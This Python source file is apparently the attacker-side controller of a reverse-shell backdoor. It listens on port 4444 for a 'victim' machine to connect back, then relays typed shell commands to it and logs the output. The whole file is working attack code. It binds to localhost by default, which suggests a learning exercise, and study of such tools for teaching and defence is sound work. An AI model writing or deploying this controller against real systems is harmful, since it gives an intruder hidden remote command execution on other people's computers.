import socket


class Attacker:
    port = 4444
    file_output = open("../output.txt", "w") # log file to show output

    def __init__(self, my_ipv6='0:0:0:0:0:0:0:0'):
        self.my_ipv6 = my_ipv6
        server = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        server.bind((self.my_ipv6, self.port))
        self.print('\n[+] Server started')
        self.print('[+] Listening for victim')
        server.listen(1) # wait for victim to connect
        self.victim, self.victim_addr = server.accept()
        self.print(f'[+] {self.victim_addr} Victim opened the backdoor')
        self.start()

    def start(self):
        while True:
            command = input('\nEnter Command : ')
            self.file_output.write('Enter Command : ' + str(command) + '\n')
            command = command.encode()
            self.victim.send(command)
            self.print('[+] Command sent')

            if command == b'exit':
                break

            output = self.victim.recv(4096)
            output = output.decode()

            self.print(f"Output: {output}")  # print to screen
        self.file_output.close()

    def print(self, message):
        """Print to both the file and stdout

        Args:
            message (str): String to write
        """
        self.file_output.write(message + '\n')
        print(message)


if __name__ == "__main__":
    Attacker('localhost')
